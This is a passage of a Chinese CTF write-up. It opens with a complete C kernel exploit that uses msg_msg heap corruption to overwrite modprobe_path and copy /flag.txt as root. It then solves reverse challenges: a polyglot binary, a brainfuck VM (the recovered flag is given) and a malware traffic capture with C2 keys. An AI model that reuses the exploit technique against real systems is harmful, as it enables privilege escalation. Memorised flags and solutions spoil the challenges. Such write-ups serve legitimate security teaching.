- 申请多个小的msg_msg，使两个结构在堆中相邻
- 修改next指针到目标位置，修改modprobe为/tmp/x

exp:

```c
#include "./exploit.h" // some header files

#define NFT_RMALL 0x1337
#define NFT_ADD 0xdeadbeef
#define NFT_GET 0xcafebabe
#define NFT_EDIT 0xbabecafe

#define CHUNK_SIZE 0x100

struct list_head {
  struct list_head *next, *prev;
};

struct msg_msg {
  struct list_head m_list;
  long m_type;
  size_t m_ts;    /* message text size */
  void *next;     /* struct msg_msgseg *next; */
  void *security; 
                  /* the actual message follows immediately */
};

typedef struct {
  long mtype;
  char mtext[1];
} msg;

typedef struct sofirium_head {
  char coin_art[0x70];
  struct sofirium_entry *head;
  int total_nft;
} sofirium_head;

typedef struct sofirium_entry {
  struct sofirium_entry *next;
  char nft[CHUNK_SIZE];
} sofirium_entry;

typedef struct request {
  int idx;
  char buffer[CHUNK_SIZE];
} request;

int global_fd = 0;
uint64_t kernheap, kernbase;

void die(const char *msg){
  perror(msg);
  exit(-1);
}

void rmall() {
  request req;
  bzero(&req, sizeof(req));
  int ret = ioctl(global_fd, NFT_RMALL, &req);
  if (ret < 0) {
    die("[!] Failed to rmall");
  }
}

void add(void *data) {
  request req;
  bzero(&req, sizeof(req));
  memcpy(req.buffer, data, sizeof(req.buffer));
  int ret = ioctl(global_fd, NFT_ADD, &req);
  if (ret < 0) {
    die("[!] Failed to add");
  }
}

void get(int idx, void *data) {
  request req;
  bzero(&req, sizeof(req));
  req.idx = idx;
  int ret = ioctl(global_fd, NFT_GET, &req);
  if (ret < 0) {
    die("[!] Failed to get");
  }
  memcpy(data, req.buffer, sizeof(req.buffer));
}

void edit(int idx, void *data) {
  request req;
  bzero(&req, sizeof(req));
  req.idx = idx;
  memcpy(req.buffer, data, sizeof(req.buffer));
  int ret = ioctl(global_fd, NFT_EDIT, &req);
  if (ret < 0) {
    die("[!] Failed to edit");
  }
}

void hexdump(void *data, int size) {
  uint64_t *a = (uint64_t *)data;
  for (int i = 0; i < size / 8; i++) {
    printf("[%02x]: 0x%lx\n", i * 8, a[i]);
  }
}

void send_msg(int id, void *buf, size_t size, int flags) {
  if (msgsnd(id, buf, size, flags) < 0) {
    die("[!] Failed to send msg");
  }
  printf("[+] Send message: 0x%lx\n", size);
}

void get_flag(void){
    system("echo '#!/bin/sh\ncp /flag.txt /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag >> /tmp/1");
    system("cat /tmp/1");

    exit(0);
}

uint64_t leak() {
  FILE *fp = popen("cat /proc/kallsyms |grep _stext", "r");
  if (fp == NULL) {
    die("[!] Error opening /proc/kallsyms");
  }
  char line[1024];
  bzero(line, 1024);
  char *p;
  fread(&line, 0x10, 0x10, fp);
  p = strchr(line, ' ');
  *p = "\x00";
  return strtoull(line, NULL, 16);
}

int main(int argc, char **argv) {
  global_fd = open("/dev/Sofire", O_NONBLOCK);
  if (global_fd < 0) {
    die("[!] Failed to open /dev/chall");
  }
  int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  if (qid < 0) {
    die("[!] Failed to msgget");
  }
  printf("[+] qid = %d\n", qid);

  kernbase = leak();
  printf("[*] Send message\n");
  msg *message = calloc(1, 0x200 + 8);
  bzero(message, 0x200 + 8);
  message->mtype = 1;
  memset(message->mtext, 'P', 0x200 - 0x30);

  char buf[CHUNK_SIZE];
  memset(buf, 'A', sizeof(buf));

  for (int i = 0; i < 24; i++) {
    add(buf);
  }

  printf("[+] 1 Remove all\n");
  rmall();

  printf("[+] Heap spary\n");
  for (int i = 0; i < 1; i++) {
    send_msg(qid, message, 0x200 - 0x30, 0); // 23
  }
  send_msg(qid, message, 0x40 - 0x30, 0); // 24
  send_msg(qid, message, 0x40 - 0x30, 0); // 25
  send_msg(qid, message, 0x40 - 0x30, 0); // 26
  send_msg(qid, message, 0x40 - 0x30, 0); // 27

  printf("[+] kernbase: 0x%lx\n", kernbase);
  uint64_t modprobe = kernbase + 0x1851400;

  // use 25 change 26's next, 27 is target
  uint64_t save_buf[0x100 / 8];

  get(25, buf); // 23(1d0) - 24(10) - 25(10) - 26(10) - 27(10)
  memcpy(save_buf, buf, sizeof(save_buf));
  hexdump(buf, sizeof(buf));
  save_buf[7] = modprobe - 8;

  edit(25, save_buf);

  bzero(buf, sizeof(buf));
  *(uint64_t *)buf = 0x782f706d742f; // /tmp/x
  edit(27, buf);
  get_flag();

  return 0;
}
```

## Reverse:

### Polyglot:

```
~/Desktop$ file polyglot 
polyglot: DOS executable (COM)
```

丢到 IDA 各种架构一顿测试，发现为 `ARM64` 和 `x86-64`, 简单分析后发现基本逻辑都是解密后使用系统调用 print 出来直接使用 unicorn 模拟执行。

`ARM64` 部分:

```
from capstone import *
from unicorn import *
from unicorn.arm64_const import *

cs = Cs(CS_ARCH_ARM64, UC_MODE_ARM)
polyglot = open('./polyglot', 'rb')
code = polyglot.read()
polyglot.close()
ADDRESS = 0
STACK = 0x100000
def hook_code(uc: Uc, address, size, user_data):
    # print(">>> Tracing instruction at 0x%x, instruction size = 0x%x" % (address, size))
    for i in cs.disasm(uc.mem_read(address, size), address):
        print("0x%x:\t%s\t%s" % (i.address, i.mnemonic, i.op_str))
        if i.mnemonic == 'svc':
            call = uc.reg_read(UC_ARM64_REG_X8)
            print(f">>> syscall num: {call}")
            if call == 64:
                print(f">>> {uc.mem_read(uc.reg_read(UC_ARM64_REG_X1), uc.reg_read(UC_ARM64_REG_X2))}")
uc = Uc(UC_ARCH_ARM64, UC_MODE_ARM)
uc.mem_map(ADDRESS, 0x100000)
uc.mem_map(STACK, 0x1000)
uc.mem_write(ADDRESS, code)
uc.reg_write(UC_ARM64_REG_SP, STACK + 0x1000)
uc.hook_add(UC_HOOK_CODE, hook_code)
uc.emu_start(ADDRESS, ADDRESS + 0x44)
```

`x86-64`部分：

```
from capstone import *
from unicorn import *
from unicorn.x86_const import *

cs = Cs(CS_ARCH_X86, CS_MODE_64)

polyglot = open('./polyglot', 'rb')
code = polyglot.read()
polyglot.close()

ADDRESS = 0
STACK = 0x100000


def hook_code(uc: Uc, address, size, user_data):
    # print(">>> Tracing instruction at 0x%x, instruction size = 0x%x" % (address, size))
    for i in cs.disasm(uc.mem_read(address, size), address):
        print("0x%x:\t%s\t%s" % (i.address, i.mnemonic, i.op_str))
        if i.mnemonic == 'syscall':
            call = uc.reg_read(UC_X86_REG_RAX)
            print(f">>> syscall num: {call}")
            if call == 1:
                print(f">>> arg1 = {uc.reg_read(UC_X86_REG_RDI)}, arg2 = {uc.mem_read(uc.reg_read(UC_X86_REG_RSI), uc.reg_read(UC_X86_REG_RDX))}")

uc = Uc(UC_ARCH_X86, UC_MODE_64)
uc.mem_map(ADDRESS, 0x100000)
uc.mem_map(STACK, 0x1000)
uc.mem_write(ADDRESS, code)
uc.reg_write(UC_X86_REG_RSP, STACK + 0x1000)
uc.hook_add(UC_HOOK_CODE, hook_code)
uc.emu_start(ADDRESS, ADDRESS + 0x2a7)
```

### Side Effect:

一道虚拟机题，程序读入`prog`和`mem`文件然后加载进虚拟机。点进`sub_4015BF`，这里面映射了一页可以执行的内存，然后把一些指令片段copy过去：

![](https://i.imgur.com/kxjIjSQ.png)

再调用`sub_401444`修正`404800`处的20个数组，每个数组里面都放着一些数字，它们被解析成指向指令片段的指针或者库函数：

![](https://i.imgur.com/pMzewEq.png)

然后申请内存创建虚拟机对象，它的数据结构分析如下：

```
struct instruct {
    uint16_t op, opr1, opr2;
};

struct vm {
        uint16_t reg[0x10000];
        uint16_t pc;
    struct {
        uint16_t LF: 1;  // SF ^ OF
        uint16_t ZF: 1;  // ZF
        uint16_t GF: 1;  // !(SF ^ OF | ZF)
        uint16_t FF: 1;  // set IF function fails
    } flags;
        void *ptrs[0x10000];
        struct instruct prog[0x10000];
        uint16_t mem[0x10000];
};
```

reg是寄存器，一共有65536个，但其实用上的也就不到10个；pc是程序计数器；flag是标志位；ptrs存放虚拟机调用一些函数时生成的指针，虚拟机内部可以操作这些指针并把它们传入别的函数；prog存放指令；mem存放用户数据。把这些导入IDA，再观察主函数：

![](https://i.imgur.com/kIk2lts.png)

`vm_exec`做了一些初始工作，然后开始执行虚拟机：

![](https://i.imgur.com/bck3vXC.png)

这个`vm_exec`简单读出一条指令，然后执行`vm_exec_instruction`：

![](https://i.imgur.com/2FBFXuQ.png)

与一般的虚拟机题不同，这个虚拟机并没有`switch-case`，它从之前初始化时的20个数组中找到对应的，把它们copy到栈顶，然后直接调用栈顶的函数指针。对这20个数组进行分析，发现每一个数组的开头都是这个函数：

```asm
add rsp, 10h
retn
```

它修改了rsp的值。而调用这个stub时，栈上放着返回地址和指针数组（第一个是此stub的地址），而执行第一句指令以后，返回地址就变成了第二个地址，而它执行另一个stub，例如：

```asm
inc ecx
retn
```

这个stub返回时会执行第三个地址，如此循环下去，相当于执行了一整条ROP链，最后一个stub是：

```
leave
retn
```

此时rsp恢复正常，程序准备执行下一条指令。

把相关数据扒下来，用Python把切成片段的stub重组，然后整理成一个程序重新编译。值得注意的是程序使用`pop`和`cmov`来实现分支跳转，这部分需要单独处理：

```python
from capstone import *
import os, re

cs = Cs(CS_ARCH_X86, CS_MODE_64)
cs.syntax = CS_OPT_SYNTAX_ATT

lines = open('vm.txt').read().splitlines() # vm.txt content from IDA assembly window
arr: list[list[int]] = []
current: list[int] = None
for line in lines:
    if line.startswith('qword'):
        if current is not None:
            arr.append(current)
        current = []
    line = line[line.find('dq ')+3:]
    if line.endswith('h'): line = line[:-1]
    line = int(line, 16)
    current.append(line)
arr.append(current)

stubs = bytes.fromhex('4839D6C3480F4CD9C383F8FFC30FB775E4C34883E204C34889F3C366890477C34883E202C3488984F708000200C34883C801C348C7C000000000C34883C804C36629D8C34883CE08C34883C802C359C30FB71C57C30FB755E8C348C7C600000000C3488B9CD708000200C34883E201C34889DEC34881E6F7FF0000C383FA00C35BC34883C410C3C30FB78700000200C30FB73477C30FB73457C3C9C366F7F3C3488B7DE8C3480F4FD9C36689B702000200C3FFE3C34889C7C30FB7B702000200C366F7E3C34883E208C366898700000200C36689D0C36601D8C30FB70477C36689C6C30FB79702000200C3480F44D9C3488B84F708000200C30FB7845F08001000C30FB78702000200C36689B47708001000C34889C6C34889DAC3')

ret = False
imap = {}
for addr, _, op, opr in cs.disasm_lite(stubs, 0):
    if ret:
        assert op == 'retq'
        ret = False
    else:
        if op == 'retq':
            op = 'nop'
        elif opr != '':
            op += ' ' + opr
        imap[addr] = op
        if op != 'nop':
            ret = True

for ops in arr:
    for i, op in enumerate(ops):
        if op >= 0x100000:
            ops[i] = 'call %s' % ('tmpfile', 'fclose', 'getc', 'ungetc', 'putc', 'exit')[op - 0x100000]
        else:
            ops[i] = imap[op]

class InstrState:
    def __init__(self, prefix):
        self._list = []
        self._state = 0 # 0正常 1rbx 2rcx 其他为cmov
        self._branch = [None, None]
        self._prefix = prefix
        self._i = 0

    def push(self, instr: str):
        if instr == 'addq $0x10, %rsp':
            return
        elif instr == 'leave':
            instr = 'retq'
        elif instr == 'movq -0x18(%rbp), %rdi':
            instr = 'movq vm(%rip), %rdi'
        elif instr == 'movzwl -0x1c(%rbp), %esi':
            instr = 'movzwl opr1(%rip), %esi'

        match = re.fullmatch('cmov(.*)q %rcx, %rbx', instr)
        if instr == 'popq %rbx':
            self._state = 1
        elif instr == 'popq %rcx':
            self._state = 2
        elif match:
            self._state = match.group(1)
        else:
            if self._state == 0:
                self._list.append(instr)
            elif self._state == 1:
                self._branch[0] = instr
                self._state = 0
            elif self._state == 2:
                self._branch[1] = instr
                self._state = 0
            else:
                if instr == 'jmpq *%rbx':
                    l1 = '.%s%d' % (self._prefix, self._i)
                    l2 = '.%s%d' % (self._prefix, self._i + 1)
                    self._i += 2
                    self._list.extend((
                        'j%s %s' % (self._state, l1),
                        self._branch[0],
                        'jmp %s' % l2,
                        '%s:' % l1,
                        self._branch[1],
                        '%s:' % l2,
                    ))
                    self._state = 0
                else:
                    self._list.append(instr)

    def get(self):
        return self._list + ['retq']

for i, ops in enumerate(arr):
    state = InstrState('L%02d' % i)
    for op in ops[:-1]:
        state.push(op)
    arr[i] = state.get()

#import json
#arr = dict(('op_%02d' % i, c) for i, c in enumerate(arr))
#json.dump(arr, open('dump.json', 'w'), indent=2)
#exit()

dummy = ''
for i, code in enumerate(arr):
    dummy += '''\
static void op_%02d(struct vm *vm, uint16_t opr1, uint16_t opr2) __attribute__((naked));
void op_%02d(struct vm *vm, uint16_t opr1, uint16_t opr2) {
    __asm__(
%s
    );
}

''' % (i, i, ''.join('        "%s\\n"\n' % c for c in code))

dummy = open('template.c').read().replace('// dummy', dummy)
open('dummy.c', 'w').write(dummy)
assert os.system('gcc -g -o dummy dummy.c') == 0
os.unlink('dummy.c')
```

dummy.c：

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

struct instruct {
    uint16_t op, opr1, opr2;
};

struct vm {
        uint16_t reg[0x10000];
        uint16_t pc;
    struct {
        uint16_t LF: 1;  // SF ^ OF
        uint16_t ZF: 1;  // ZF
        uint16_t GF: 1;  // !(SF ^ OF | ZF)
        uint16_t FF: 1;  // set IF function fails
    } flags;
        void *ptrs[0x10000];
        struct instruct prog[0x10000];
        uint16_t mem[0x10000];
};

typedef void (*vm_func)(struct vm *, uint16_t, uint16_t);
static struct vm *vm;
static uint16_t opr1 = 0;

// dummy

static vm_func funcs[] = {op_00, op_01, op_02, op_03, op_04, op_05, op_06, op_07, op_08, op_09, op_10, op_11, op_12, op_13, op_14, op_15, op_16, op_17, op_18, op_19};

static const struct instruct prog[] = {
    // from file prog
};

static const uint16_t mem[] = {
    // from file mem
};

int main() {
    vm = (struct vm *)malloc(sizeof (struct vm));
    if (vm) {
        memcpy(vm->prog, prog, sizeof (prog));
        memcpy(vm->mem, mem, sizeof (mem));
        vm->pc = 0;
        vm->ptrs[0] = stdin;
        vm->ptrs[1] = stdout;
        vm->ptrs[2] = stderr;
        for (;; ++vm->pc) {
            struct instruct *instr = &vm->prog[vm->pc];
            if (instr->op < 20) {
                opr1 = instr->opr1;
                funcs[instr->op](vm, instr->opr1, instr->opr2);
            }
        }
        free(vm);
    }
    return 0;
}
```

用IDA打开新生成的dummy文件，就知道20条指令分别做了什么了：

![](https://i.imgur.com/Ktb8Dsd.png)

但实际上这个文件并不能被成功执行，经过与原程序的对比调试发现是`op_16`不一致，但无妨继续分析代码。指令的格式是`op x, y`，二十条指令分别是：

```
00 add rx, ry
01 sub rx, ry
02 mul rx, ry
03 div rx, ry
04 mod rx, ry
05 mov rx, y
06 ptrs[rx] = tmpfile()
07 fclose(ptrs[rx])
08 rx = getc(ptrs[ry]), set FF
09 ungetc(rx, ptrs[ry])
10 putc(rx, ptrs[ry])
11 exit(rx)
12 cmp rx, ry
13 jmp $+x
14 jb $+x
15 jz $+x
16 ja $+x
17 jf $+x ; jump if previous getc fails.
18 mov [r1], r2
19 mov r1, [r2]
```

解析并整理，代码如下（`ja`指令实际上应该是`je`指令）：

```
printf("Initializing Interpreter...\n");
printf("read(0, buf, 50);\n");
printf("Flag?\n");
f0 = tmpfile()
f1 = tmpfile()
f2 = tmpfile()
f3 = tmpfile()

mov r4, 0
mov r7, 1
L117:
mov r5, [r4]
mov r6, 0
cmp r5, r6
ja L124
ungetc(r5, f1)
add r4, r7
jmp L117
L124:

mov r4, 0
ungetc(r4, f3)
L126:
op20 15, 0
r4 = getc(f1)
ungetc(r4, f1)
jf L250
mov r5, 127
cmp r4, r5
ja L157
mov r5, 159
cmp r4, r5
ja L163
mov r5, 218
cmp r4, r5
ja L238
mov r5, 37
cmp r4, r5
ja L189
mov r5, 9
cmp r4, r5
ja L194
mov r5, 101
cmp r4, r5
ja L205
mov r5, 74
cmp r4, r5
ja L212
mov r5, 66
cmp r4, r5
ja L245
L154:
r4 = getc(f1)
ungetc(r4, f0)
jmp L126

L157:
r5 = getc(f3)
jf L161
L159:
ungetc(r5, f2)
jmp L154
L161:
mov r5, 0
jmp L159
L163:
mov r6, 0
r5 = getc(f3)
ungetc(r5, f3)
cmp r5, r6
ja L169
jmp L154

L169:
mov r6, 0
mov r8, 1
mov r9, 0
L172:
r5 = getc(f1)
ungetc(r5, f1)
mov r7, 159
cmp r5, r7
ja L185
L177:
mov r7, 74
cmp r5, r7
ja L187
L180:
cmp r6, r9
ja L154
r5 = getc(f1)
ungetc(r5, f0)
jmp L172
L185:
add r6, r8
jmp L177
L187:
sub r6, r8
jmp L180
L189:
r5 = getc(f3)
mov r6, 1
putc(r5, stdout)
ungetc(r5, f3)
jmp L154

L194:
r5 = getc(f2)
jf L201
L196:
ungetc(r5, f3)
r5 = getc(f2)
jf L203
L199:
ungetc(r5, f3)
jmp L154

L201:
mov r5, 0
jmp L196
L203:
mov r5, 0
jmp L199

L205:
r5 = getc(f3)
mov r6, 2
mov r7, 256
add r5, r6
div r5, r7
ungetc(r5, f3)
jmp L154

L212:
mov r6, 0
r5 = getc(f3)
ungetc(r5, f3)
cmp r5, r6
jz L218
jmp L154

L218:
mov r6, 0
mov r8, 1
mov r9, 0
L221:
r5 = getc(f1)
ungetc(r5, f1)
mov r7, 159
cmp r5, r7
ja L234
L226:
mov r7, 74
cmp r5, r7
ja L236
L229:
cmp r6, r9
ja L154
r5 = getc(f0)
ungetc(r5, f1)
jmp L221

L234:
add r6, r8
jmp L226
L236:
sub r6, r8
jmp L229

L238:
r5 = getc(f3)
mov r6, 1
mov r7, 256
sub r5, r6
div r5, r7
ungetc(r5, f3)
jmp L154

L245:
mov r5, 0
r6 = getc(stdin)
r5 = getc(f3)
ungetc(r6, f3)
jmp L154
L250:
mov r0, 0
halt
```

手动翻译X_X：

```c
#include <stdint.h>

static const uint16_t mem[] = {
    // from file mem
};

#include <stdio.h>
#include <stdlib.h>

#define cmp(x, y) ((x) == (y))

int main(){
    FILE *f0, *f1, *f2, *f3;
    uint16_t r4, r5, r6, r7;
    printf("Initializing Interpreter...\n");
    printf("read(0, buf, 50);\n");
    printf("Flag?\n");
    f0 = tmpfile();
    f1 = tmpfile();
    f2 = tmpfile();
    f3 = tmpfile();
    for (r4 = 0; ; ++r4) {
        r5 = mem[r4];
        if (cmp(r5, 0)) break;
        ungetc(r5, f1);
        printf(">%d\n", r5);
    }
    ungetc(0, f3);
    L126:
    r4 = getc(f1);
    printf("<%d\n", r4);
    if (r4 == 0xFFFF) {
        // 成功分支
        exit(0);
    }
    ungetc(r4, f1);
    if (!cmp(r4, 127)) {
        if (!cmp(r4, 159)) {
            if (!cmp(r4, 218)) {
                if (!cmp(r4, 37)) {
                    if (!cmp(r4, 9)) {
                        if (!cmp(r4, 101)) {
                            if (!cmp(r4, 74)) {
                                if (!cmp(r4, 66)) {
                                    L154:
                                    r4 = getc(f1);
                                    ungetc(r4, f0);
                                    goto L126;
                                } else{
                                    // L245
                                    r6 = getc(stdin);
                                    r5 = getc(f3);
                                    ungetc(r6, f3);
                                    goto L154;
                                }
                            } else {
                                // L212
                                r5 = getc(f3);
                                ungetc(r5, f3);
                                if (r5 == 0) {
                                    // L218
                                    r6 = 0;
                                    L221:
                                    r5 = getc(f1);
                                    ungetc(r5, f1);
                                    if (cmp(r5, 159)) {
                                        // L234
                                        r6 += 1;
                                    }
                                    // L226
                                    if (cmp(r7, 74)) {
                                        // L236
                                        r6 -= 1;
                                    }
                                    // L229
                                    if (cmp(r6, 0)) {
                                        goto L154;
                                    }
                                    r5 = getc(f0);
                                    ungetc(r5, f1);
                                    goto L221;
                                }
                                goto L154;
                            }
                        } else {
                            // L205
                            r5 = getc(f3);
                            r6 = 2;
                            r5 += r6;
                            r5 /= 256;
                            ungetc(r5, f3);
                            goto L154;
                        }
                    } else{
                        // L194
                        r5 = getc(f2);
                        if (r5 == 0xFFFF) {
                            r5 = 0;
                        }
                        // L196
                        ungetc(r5, f3);
                        r5 = getc(f2);
                        if (r5 == 0xFFFF) {
                            // L203
                            r5 = 0;
                        }
                        // L199
                        ungetc(r5, f3);
                        goto L154;
                    }
                } else {
                    // L189
                    r5 = getc(f3);
                    putc(r5, stdout);
                    ungetc(r5, f3);
                    goto L154;
                }
            } else {
                // L238
                r5 = getc(f3);
                r5 -= 1;
                r5 /= 256;
                ungetc(r5, f3);
                goto L154;
            }
        } else {
            // L163
            r5 = getc(f3);
            ungetc(r5, f3);
            if (!cmp(r5, 0)) {
                goto L154;
            }
            // L169
            r6 = 0;
            L172:
            r5 = getc(f1);
            ungetc(r5, f1);
            if (cmp(r5, 159)) {
                // L185
                r6 += 1;
            }
            // L177
            if (cmp(r5, 74)) {
                // L187
                r6 -= 1;
            }
            // L180
            if (cmp(r6, 0)) {
                goto L154;
            }
            r5 = getc(f1);
            ungetc(r5, f0);
            goto L172;
        }
    } else {
        // L157
        r5 = getc(f3);
        if (r5 == 0xFFFF) {
            r5 = 0;
        }
        // L159
        ungetc(r5, f2);
        goto L154;
    }
    return 0;
}
```

它也不能被执行，但是经过一段时间的观察，可以看出这是另一个brainfuck虚拟机，`mem`中的八种数字分别对应八条指令，但其中`+`指令实际执行了两次加法，`>`指令向右移动了两次指针，如果把`mem`解析成标准brainfuck，则对应表如下（注释是符号在文件中出现的次数）：

```
imap = {
    74:  ']', # 207
    218: '-', # 8528
    159: '[', # 207
    37:  '.', # 18
    101: '++', # 1314
    9:   '>>', # 412
    127: '<', # 759
    66:  ',', # 1
}
```

值得注意的是，`mem`中存放的brainfuck指令流在解析时应该倒过来看，因为程序是用`ungetc`把指令逐个`push`到文件`f1`里去的。解析完如下（数据太多了，50个`+`用`+50`表示）：

```
<5+50[-<+<64+>65]+50>+46<2[-<+<7+>8]<[->+<]<7[>,<[-<+>]<-]<6[->+>6+<7]>[-<+>]>7[-<3+>3]<3[->+>2+<3]>2[>[-<3+>3]<-[->+<]<[->+<]>2]<[->3+<3]>9[-<[-<+<5+>6]<[->+<]<5[<+7[<3[->+>+<2]>[-<+>]>2-]>2[-<2+<+>3]<2[->2+<2]>-[-<+>]<2[->2+<2]<2[-]>3]<8[->+>7+<8]>[-<+>]>8[-<2+<+>3]<3[->3+<3]>2[>[-<4+>4]<-[->+<]<[->+<]>2]>[-]<2[->2+<2]>9.<]<2+10.<9-56[>2[-<+>]<+<[-]]<-249[>2[-<+>]<+<[-]]<-57[>2[-<+>]<+<[-]]<-189[>2[-<+>]<+<[-]]<-100[>2[-<+>]<+<[-]]<-114[>2[-<+>]<+<[-]]<-19[>2[-<+>]<+<[-]]<-194[>2[-<+>]<+<[-]]<-150[>2[-<+>]<+<[-]]<-229[>2[-<+>]<+<[-]]<-15[>2[-<+>]<+<[-]]<-95[>2[-<+>]<+<[-]]<-157[>2[-<+>]<+<[-]]<-173[>2[-<+>]<+<[-]]<-224[>2[-<+>]<+<[-]]<-220[>2[-<+>]<+<[-]]<-36[>2[-<+>]<+<[-]]<-35[>2[-<+>]<+<[-]]<-119[>2[-<+>]<+<[-]]<-69[>2[-<+>]<+<[-]]<-248[>2[-<+>]<+<[-]]<-43[>2[-<+>]<+<[-]]<-148[>2[-<+>]<+<[-]]<-216[>2[-<+>]<+<[-]]<-239[>2[-<+>]<+<[-]]<-247[>2[-<+>]<+<[-]]<-68[>2[-<+>]<+<[-]]<-177[>2[-<+>]<+<[-]]<-198[>2[-<+>]<+<[-]]<-81[>2[-<+>]<+<[-]]<-224[>2[-<+>]<+<[-]]<-231[>2[-<+>]<+<[-]]<-4[>2[-<+>]<+<[-]]<-241[>2[-<+>]<+<[-]]<-74[>2[-<+>]<+<[-]]<-224[>2[-<+>]<+<[-]]<-237[>2[-<+>]<+<[-]]<-179[>2[-<+>]<+<[-]]<-196[>2[-<+>]<+<[-]]<-51[>2[-<+>]<+<[-]]<-192[>2[-<+>]<+<[-]]<-136[>2[-<+>]<+<[-]]<-96[>2[-<+>]<+<[-]]<-28[>2[-<+>]<+<[-]]<-120[>2[-<+>]<+<[-]]<-29[>2[-<+>]<+<[-]]<-208[>2[-<+>]<+<[-]]<-186[>2[-<+>]<+<[-]]<-59[>2[-<+>]<+<[-]]<-179[>2[-<+>]<+<[-]]+>[[-]<[-]+87.[-]+82.[-]+79.[-]+78.[-]+71.[-]+33.[-]+10.[-]>]<[[-]+67.[-]+79.[-]+82.[-]+82.[-]+69.[-]+67.[-]+84.[-]+33.[-]+10.[-]]
```

从百度可以了解到一些brainfuck的一些经典操作：

```
[-] ; clear `*p`
[->+>+<<]>[-<+>]< ; copy `*p` to `*(p+2)`
```

代码的前几行是对输入的flag进行变换，中间是判断变换后的flag的每一位是否为指定值，后面是输出正确与否的信息。中间的数组如下：

```
[56,249,57,189,100,114,19,194,150,229,15,95,157,173,224,220,36,35,119,69,248,43,148,216,239,247,68,177,198,81,224,231,4,241,74,224,237,179,196,51,192,136,96,28,120,29,208,186,59,179]
```

brainfuck的代码看似很多，实际加密过程也就只位于前半部分。对前半部分手动逆向，并用解释器验证结果（可以找一个brainfuck的在线解释器）。

逆向的示意结果：

```
p[4] = 46; p[5] = p[6] = 50; p[11] = last(); p[16~65] = input(); p[70] = 50; p = 5;
[-
        p[12] = p[6]; p = 12;
        p[14] = p[16] * 7 + p[11]; p = 13;
        p[13] = p[12] - 1; p[12] = 0; p = 13;
        [
                p[12] = p[14]; p[14] = p[16] = 0; p = 13;
        ]
        ; now is 0 0 0 0 46 49 50 0 0 0 0 49 p[12-61] 0 0 0 0 0 0 0 0 50; p = 62;
        
        p[62] = p[70]; p = 61;
        p[63] = p[61]; p = 62;
        [
                p[65] = p[61]; p[61] = 0; p = 62;
                p[62] -= 1; p = 61;
        ]
]
```

brainfuck的一个特点是代码与位置高度相关，因此很难翻译回容易理解的代码，上面的代码仅能起到参考作用。这一段大致意思为：先读入50个字符，接着进行50轮操作，每轮操作如下：

```python
for i, c in enumerate(ipt):
    ipt[i] = c * 7 + ipt[i - 1] & 255
```

然后可以写出如下脚本解密flag（前半部分只是验证动态调试的结果是否与分析结果一致）：

```python

x=bytearray(b'1'*50)
y=[56,249,57,189,100,114,19,194,150,229,15,95,157,173,224,220,36,35,119,69,248,43,148,216,239,247,68,177,198,81,224,231,4,241,74,224,237,179,196,51,192,136,96,28,120,29,208,186,59,179]

for i in range(len(x)):
    for i, c in enumerate(x):
        c = c * 7 + x[i - 1]
        x[i] = c & 255
assert list(x) == [131,249,88,252,65,234,135,143,175,188,75,191,35,85,222,232,91,218,223,67,11,222,18,97,165,32,232,220,121,44,49,77,183,58,216,51,6,71,14,109,254,4,43,237,39,154,134,59,76,243]

from Crypto.Util.number import inverse
i7 = inverse(7, 256)
for i in range(len(y)):
    for i, c in enumerate(reversed(y)):
        i = len(y) - i - 1
        c = (c - y[i - 1]) * i7
        y[i] = c & 255
print(bytes(y).decode())
```

最后结果：

`idek{bf=two_zippers=four_stacks=getc_and_ungetc..}`

### Sus Meow:

附件可以分离出一个流量包，分析流量包可以发现远程服务器先丢了个powershell脚本，脚本会创建一个exe并执行。exe有花指令je+jne，直接patch掉：

```py
from idaapi import *
start_ea = 0x400000
end_ea = 0x40EFA0

for ea in range(start_ea,end_ea):
    if get_bytes(ea,5) == b'\x74\x04\x75\x02\xd9':
        patch_bytes(ea,b'\x90\x90\x90\x90\x90')
```

程序一开始先在402B80手动加载dll和获取dll函数地址并保存，直接下个断点就能拿到所有要用到的动态库函数。接着在401E20以http方式连接10.0.2.15:8080并接收数据。从流量包里拿到数据后base64解码得到一个json：

```
{"token": "ae02977a8737de6b040b8ad4551a0213b8b20674241eb8dd84c14e74cf337772", "key": "O9jfIvI9BIHK0rXOpXOm9eY+/VamMhLM8VOEhrQiGKZi6vTXiTj72ZLPzmOOAeU+azt4EjR3jdsrSe9QiwY2Sg=="}
```

接下来对json进行解析，获取字段数据。之后通过随机数生成AES的key和iv，拼在一起，并将其打包成一个json：

```
{"private": "15B627BBD8CAEE73125679E4C465253F08C9770576F6C47C734CF5A07A2E7A57", "port": 12345}
```

随后利用前面的key对json进行rc4加密，前面附上token，base64编码后通过12345端口以http方式发送给服务器。后面的流程就是服务器不断发送加密之后的指令，然后程序接收之后AES-CBC解密并根据command和arg执行命令，大概就是服务器查看当前目录，然后打开flag.txt并随机生成4字节密钥进行rc4加密，最后将其上传。所以在流量包找到最后程序上传到服务器的数据解密就得到flag：

```py
from base64 import b64decode
from Crypto.Cipher import ARC4, AES
from binascii import unhexlify

#rc4_key = b64decode('O9jfIvI9BIHK0rXOpXOm9eY+/VamMhLM8VOEhrQiGKZi6vTXiTj72ZLPzmOOAeU+azt4EjR3jdsrSe9QiwY2Sg==')
#rc4_cryptor = ARC4.new(rc4_key)
#wired_json = rc4_cryptor.decrypt(b64decode('YWUwMjk3N2E4NzM3ZGU2YjA0MGI4YWQ0NTUxYTAyMTNiOGIyMDY3NDI0MWViOGRkODRjMTRlNzRjZjMzNzc3MvqKYi9C4ShnMCAW+ROz+r5VvDidfJYCtNDoPg0XB8qkRkSpx9XPIP7ktZfpn35KHJeUkFFUd5Bn+iGqHge2v+9sjDiPsugqKaDwdFTeD1yFvDmxhhHSfl0gucow/RI=')[64:])
#print(wired_json)
AES_key = unhexlify('15B627BBD8CAEE73125679E4C465253F08C9770576F6C47C734CF5A07A2E7A57'[:32])
AES_iv = unhexlify('15B627BBD8CAEE73125679E4C465253F08C9770576F6C47C734CF5A07A2E7A57'[32:])
#AES_cryptor = AES.new(AES_key, AES.MODE_CBC, AES_iv)
